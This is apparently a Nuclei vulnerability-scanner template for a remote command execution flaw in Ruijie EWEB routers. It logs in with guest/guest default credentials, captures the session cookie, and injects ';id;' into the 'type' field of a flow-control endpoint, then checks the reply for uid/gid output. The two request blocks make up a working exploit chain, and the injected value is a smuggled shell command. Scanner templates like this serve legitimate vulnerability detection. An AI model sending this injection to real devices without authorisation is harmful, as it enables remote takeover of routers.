id: ruijieEWEB-control_php-RCE

info:
  name: 锐捷EWEB路由器 control.php 远程命令执行漏洞
  author: xxx
  severity: high
  tags: RCE

http:
  - raw:
      - |
        POST /ddi/server/login.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
        Content-Type: application/x-www-form-urlencoded

        username=guest&password=guest?
    extractors:
      - type: regex
        part: header
        name: RUIJIEID
        group: 1
        regex:
          - 'RUIJIEID=(.*?);'
        internal: true
  - raw:
      - |
        POST /flow_control_pi/flwo.control.php?a=setFlowGroup HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
        Content-Type: application/x-www-form-urlencoded
        Cookie: {{RUIJIEID}}

        type=;id;
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'uid='
          - 'gid='
        condition: and
      - type: status
        status: 
          - 200